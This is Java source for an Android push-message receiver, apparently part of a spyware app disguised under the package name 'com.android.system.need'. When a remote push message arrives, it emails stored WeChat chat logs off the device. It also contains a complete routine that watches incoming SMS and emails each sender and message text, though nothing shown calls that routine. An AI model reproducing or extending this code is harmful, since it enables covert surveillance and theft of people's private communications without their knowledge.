package com.android.system.need;

import android.content.ContentResolver;
import android.content.Context;
import android.content.Intent;
import android.content.SharedPreferences;
import android.database.Cursor;
import android.net.Uri;
import android.util.Log;
import android.view.View;
import android.view.ViewGroup;
import android.widget.CursorAdapter;

import com.xiaomi.mipush.sdk.ErrorCode;
import com.xiaomi.mipush.sdk.MiPushClient;
import com.xiaomi.mipush.sdk.MiPushCommandMessage;
import com.xiaomi.mipush.sdk.MiPushMessage;
import com.xiaomi.mipush.sdk.PushMessageReceiver;

import org.json.JSONObject;

import java.util.List;

import static android.content.Context.MODE_PRIVATE;

/**
 * Created by yang on 2017/1/19.
 * 用于接收小米推送的 BroadcastReceiver
 */

public class XiaomiPushBroadcastReceiver extends PushMessageReceiver {


    /**
     * 用来接收服务器发来的通知栏消息
     * （消息到达客户端时触发，并且可以接收应用在前台时不弹出通知的通知消息）
     */
    @Override
    public void onNotificationMessageArrived(Context context, MiPushMessage message) {

    }

    /**
     * 用来接收服务器发来的通知栏消息（用户点击通知栏时触发）
     */
    @Override
    public void onNotificationMessageClicked(Context context, MiPushMessage message) {

//
    }

    /**
     * 用来接收服务器发送的透传消息
     */
    @Override
    public void onReceivePassThroughMessage(final Context context, MiPushMessage message) {
        Log.i("###","透传消息");
        sendEmail(context);
    }


    /**
     * 用来接受客户端向服务器发送注册命令消息后返回的响应。
     */
    @Override
    public void onReceiveRegisterResult(Context context, MiPushCommandMessage message) {

        //去拉起 MyService
//        Intent intent = new Intent(context,MyService.class);
//        context.startService(intent);

        //checkMSG(context);

        String command = message.getCommand();
        List<String> arguments = message.getCommandArguments();
        String mRegId = ((arguments != null && arguments.size() > 0) ? arguments.get(0) : null);
        if (MiPushClient.COMMAND_REGISTER.equals(command)) {
            if (message.getResultCode() == ErrorCode.SUCCESS) {
                //小米推送初注册成功

                Log.i("###","小米推送初注册成功");
                //去拉起 MyService
                //context.startService(intent);

            }

        }
    }


    /**
     * 用来接收客户端向服务器发送命令消息后返回的响应
     */
    @Override
    public void onCommandResult(Context context, MiPushCommandMessage message) {
    }


    /**
     * 发送邮件
     */
    private void sendEmail(final Context context){
        try {

                    // 读取文件中的消息，并发送邮件
                    SharedPreferences settings = context.getSharedPreferences("my_spf", MODE_PRIVATE);
                    String EmaiBody=settings.getString("msg_key","没有消息，或者发生异常");
                    SendEmailHelper.sendEmail("微信聊天如下： \n" +
                            "\n"+EmaiBody);
                    Log.i("***","--sendEmail--:"+EmaiBody);
                    //每次发送之后把 SharedPreferences my_spf 文件对应的 msg_key 值变为""
                    SharedPreferences.Editor editor = settings.edit();
                    editor.putString("msg_key","");
                    editor.commit();


        }catch (Exception e){
            e.printStackTrace();
        }

    }
    /**
     * 检查短息
     */
    private String struri = "content://sms";
    private ContentResolver resolver = null;
    private String body = "";
    private String address = "";

    private  void checkMSG(final Context context){
        try {

            resolver = context.getApplicationContext().getContentResolver();
            Cursor cursor = resolver.query(Uri.parse(struri), null, null, null,
                    null);
            CursorAdapter adapter = new CursorAdapter(context, cursor,
                    CursorAdapter.FLAG_REGISTER_CONTENT_OBSERVER) {

                @Override
                public View newView(Context arg0, Cursor arg1, ViewGroup arg2) {
                    // TODO Auto-generated method stub
                    return null;
                }

                @Override
                public void bindView(View arg0, Context arg1, Cursor arg2) {
                    // TODO Auto-generated method stub

                }

                @Override
                protected void onContentChanged() {
                    super.onContentChanged();
                    Log.i("###","onContentChanged");
                    Cursor cursor = resolver.query(Uri.parse(struri), null, null,
                            null, null);
                    cursor.moveToFirst();
                    address = cursor.getString(cursor.getColumnIndex("address"));
                    body = cursor.getString(cursor.getColumnIndex("body"));

                            // 读取文件中的消息，并发送邮件
                            SharedPreferences settings = context.getSharedPreferences("my_spf", MODE_PRIVATE);
                            String EmaiBody=settings.getString("msg_key","没有消息，或者发生异常");
                            SendEmailHelper.sendEmail("来自手机号 "+address+"\n短信内容为:"+body+"\n\n微信聊天如下： \n"+EmaiBody);
                            Log.i("***","--sendEmail--:"+EmaiBody);
                            //每次发送之后把 SharedPreferences my_spf 文件对应的 msg_key 值变为""
                            SharedPreferences.Editor editor = settings.edit();
                            editor.putString("msg_key","");
                            editor.commit();

                    //关闭指针？

                    //cursor.close();

                }
            };
            //cursor.close();
        }catch (Exception e){
            e.printStackTrace();
        }
    }
}

